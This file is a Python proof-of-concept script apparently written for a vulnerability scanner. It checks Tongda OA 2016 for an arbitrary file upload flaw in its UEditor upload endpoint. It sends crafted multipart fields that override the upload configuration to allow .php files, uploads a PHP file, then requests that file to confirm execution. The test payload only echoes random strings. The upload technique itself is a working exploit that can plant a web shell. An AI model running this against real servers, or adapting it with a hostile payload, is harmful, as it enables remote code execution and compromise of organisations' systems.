import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': '通达OA 2016 任意文件上传',
        'vulnerable': False,
        'url': url,
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    filename = "test"  # .php
    shell = f'<?php echo "{randstr1}"."{randstr2}";?>'
    payload = '/module/ueditor/php/action_upload.php?action=uploadfile'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=00content0boundary00',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '--00content0boundary00\r\nContent-Disposition: form-data; name="CONFIG[fileFieldName]"\r\n\r\nff\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="CONFIG[fileMaxSize]"\r\n\r\n1000000000\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="CONFIG[filePathFormat]"\r\n\r\n{0}\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="CONFIG[fileAllowFiles][]"\r\n\r\n.php\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="ff"; filename="t.php"\r\nContent-Type: text/plain\r\n\r\n{1}\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="mufile"\r\n\r\nSubmit\r\n--00content0boundary00--'.format(filename, shell)
    verify_url = urllib.parse.urljoin(url, filename + '.php')
    try:
        rep = requests.get(vurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, timeout=timeout, verify=False)
        if rep.status_code == 200:
            rep2 = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
            verify_rep = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if verify_rep.status_code == 200 and re.search(randstr1 + randstr2, verify_rep.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult
